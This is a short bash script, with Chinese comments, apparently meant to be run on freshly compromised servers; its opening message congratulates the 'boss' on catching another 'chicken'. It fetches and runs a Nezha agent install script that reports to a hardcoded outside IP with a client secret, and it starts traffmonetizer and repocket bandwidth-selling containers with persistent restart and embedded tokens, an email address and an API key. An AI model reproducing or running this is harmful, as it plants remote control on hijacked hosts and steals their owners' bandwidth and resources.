#!/bin/bash
echo "老板又抓到鸡啦？恭喜恭喜啊！！！"
# 更新APT包列表
sudo apt update

# 安装 unzip
echo "安装 unzip..."
sudo apt install -y unzip

# 安装并执行agent.sh脚本
echo "安装并执行 agent.sh..."
curl -L https://raw.githubusercontent.com/nezhahq/scripts/main/agent/install.sh -o agent.sh && chmod +x agent.sh && \
env NZ_SERVER=138.2.92.42:9981 NZ_TLS=false NZ_CLIENT_SECRET=RMw9rBte3K6MAALtanfPossnw1Z1RwKf ./agent.sh

# 安装 Docker
echo "安装 Docker..."
sudo apt install -y docker.io

# 安装 Docker Compose
echo "安装 Docker Compose..."
curl -L "https://github.com/docker/compose/releases/latest/download/docker-compose-$(uname -s)-$(uname -m)" -o /usr/local/bin/docker-compose
chmod +x /usr/local/bin/docker-compose

# 执行 Docker 命令
echo "启动 traffmonetizer..."
docker run --name traa -d traffmonetizer/cli_v2 start accept --token FfS7aIWXg3XZuMO+tiau5Y36klu9j4hY3N7AM3X6f6s=

echo "设置 traa 容器自动重启..."
docker update --restart=always traa

echo "启动 repocket..."
docker run --name repocket -e RP_EMAIL=boss.yangzhen@gmail.com -e RP_API_KEY=2567fdd2-7ca8-4980-ad33-0038676b95d2 -d --restart=always repocket/repocket

echo "设置 repocket 容器自动重启..."
docker update --restart=always repocket

echo "老板，都安装完成了！"
